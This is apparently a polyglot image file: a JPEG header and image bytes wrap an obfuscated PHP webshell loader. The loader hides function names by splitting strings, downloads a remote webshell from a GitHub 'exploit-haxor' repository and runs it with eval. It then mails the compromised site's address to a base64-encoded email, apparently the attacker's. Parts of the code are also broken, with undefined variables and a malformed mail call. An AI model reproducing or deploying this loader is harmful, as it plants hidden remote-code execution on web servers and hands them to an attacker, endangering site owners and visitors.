JFIF
<?php
function geturlsinfo($f)
{
    $fpn = "f" . "o" . "p" . "e" . "n";
    $strim =
        "s" .
        "t" .
        "r" .
        "e" .
        "a" .
        "m" .
        "_" .
        "g" .
        "e" .
        "t" .
        "_" .
        "c" .
        "o" .
        "n" .
        "t" .
        "e" .
        "n" .
        "t" .
        "s";
    $fgt =
        "f" .
        "i" .
        "l" .
        "e" .
        "_" .
        "g" .
        "e" .
        "t" .
        "_" .
        "c" .
        "o" .
        "n" .
        "t" .
        "e" .
        "n" .
        "t" .
        "s";
    $cexec = "c" . "u" . "r" . "l" . "_" . "e" . "x" . "e" . "c";
    if (function_exists($cexec)) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt(
            $conn,
            CURLOPT_USERAGENT,
            "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"
        );
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        $urls = $cexec($conn);
        curl_close($conn);
    } elseif (function_exists($fgt)) {
        $f = $fgt($f);
    } elseif (function_exists($fpn) && function_exists($strim)) {
        $handle = $fpn($f, "r");
        $f = $strim($handle);
        fclose($handle);
    } else {
        $f = false;
    }
    return $urls;
}

$f =
    "https://raw.githubusercontent.com/exploit-haxor/webshell/main/ob_gz.php";
$h = curl_init();
curl_setopt($h, CURLOPT_URL, $f);
curl_setopt($h, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($ch);
curl_close($h);
echo eval("?>" . $output);
$勩搞銐櫦埢剚技併墎晥 = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
$裤亾仌瘑笺倐曘劗銈瞾 ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";
mail($勩搞銐櫦埢剚技併墎晥,"http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . ", $裤亾仌瘑笺倐曘劗銈瞾);
C	

			

		


C	"#Qr&1!A"2qQa?y,/3Jݹ߲؋5XwyRI02PIIiMrN&"KgX:nTJnLK@!-m;g&hw@ܗ9-.1<yQUہ?.b߱֫w*V) `$bԟX-TG3g JxU/v_s(H@TJn!gfbc:l[Qe9PLbCm[5'jgl_l-;"PkQ_^Sx?"Y騐O	q`~~tUCڒV		I1_
